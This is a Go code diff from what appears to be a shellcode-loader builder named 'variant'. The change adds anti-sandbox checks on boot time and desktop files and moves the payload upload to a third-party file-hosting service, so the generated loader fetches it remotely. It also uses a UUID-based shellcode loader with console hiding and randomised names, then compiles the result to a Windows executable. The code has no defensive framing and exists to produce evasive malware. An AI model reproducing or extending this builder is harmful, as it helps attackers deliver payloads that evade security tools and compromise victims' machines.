@@ -8,22 +8,22 @@ import (
 	"variant/dynamic"
 	"variant/enc"
 	"variant/log"
+	"variant/network"
 	"variant/rand"
-	"variant/remote"
 	"variant/render"
 )
 
 func main() {
-	//local := render.Local{
-	//	KeyName:  rand.RStrings(),
-	//	KeyValue: rand.LStrings(16),
-	//	IvName:   rand.RStrings(),
-	//	IvValue:  rand.LStrings(16),
-	//}
+	// 反沙箱模块
+	sandbox := render.SandBox{
+		Methods: []string{
+			"sandbox.BootTime",
+			"sandbox.GetDesktopFiles",
+		}}
 
 	dy := render.Dynamic{
 		Import:        "variant/dynamic",
-		DynamicUrl:    "https://www.baidu.com/favicon.ico",
+		DynamicUrl:    dynamic.CtIcoUrl,
 		DynamicMethod: "dynamic.GetIcoHex",
 		DynamicKey:    rand.RStrings(),
 		KeyStart:      0,
@@ -34,7 +34,7 @@ func main() {
 	}
 
 	loader := render.Loader{
-		Method: "loader.UuidFromString",
+		Method: "loader.UuidFromStringLoad",
 		Hide:   "loader.HideConsoleW32",
 	}
 
@@ -51,17 +51,16 @@ func main() {
 	_ = params.WriteStrings(payload)
 
 	// 上传远程加载的Payload到第三方
-	cUrl := remote.Transfer{
-		Src:   params.FileName,
-		Path:  "D:\\variant\\output\\",
-		Proxy: "192.168.31.10:2080",
+	fi := network.FileIO{
+		Path: "output",
+		Src:  params.FileName,
 	}
+
 	// 设置远程加载渲染模板
 	remoteSet := render.Remote{
-		Import:  "variant/remote",
-		UrlName: rand.RStrings(),
-		Url:     cUrl.CurlUpload(),
-		Method:  "remote.RestyStrings",
+		Import: "variant/network",
+		Method: "network.FileIORead",
+		Url:    fi.FileIOUpload(),
 	}
 
 	// 定义模板渲染数据
@@ -72,11 +71,12 @@ func main() {
 		Loader:        loader,
 		Dynamic:       dy,
 		Remote:        remoteSet,
+		SandBox:       sandbox,
 	}
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/v3/Base.tmpl",
+		TmplFile:     "render/templates/v4/Base.tmpl",
 		OutputDir:    "output",
 		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
 		Data:         data,
@@ -93,10 +93,13 @@ func main() {
 		ExeFileName: fmt.Sprintf("%s.exe", strings.TrimSuffix(tOpts.OutputGoName, ".go")),
 		HideConsole: false,
 		CompilePath: "output",
+		//GSeed:       true,
+		//GDebug:      true,
+		//Literals:    true,
 	}
 
 	// 编译
-	if err = cOpts.Compile(); err != nil {
+	if err = cOpts.GoCompile(); err != nil {
 		log.Fatal(err)
 	}
 
